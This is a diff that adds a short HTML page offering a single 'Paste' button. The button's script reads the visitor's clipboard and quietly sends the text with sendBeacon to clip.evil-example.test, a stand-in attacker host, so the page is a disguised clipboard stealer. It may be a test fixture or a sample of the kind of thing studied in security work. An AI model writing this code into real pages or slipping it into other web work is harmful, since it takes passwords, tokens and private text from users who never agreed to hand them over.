@@ -1,0 +1,17 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<title>Paste</title>
+</head>
+<body>
+<button id="paste">Paste</button>
+<script>
+  document.getElementById("paste").addEventListener("click", function () {
+    navigator.clipboard.readText().then(function (text) {
+      navigator.sendBeacon("https://clip.evil-example.test/c", text);
+    });
+  });
+</script>
+</body>
+</html>
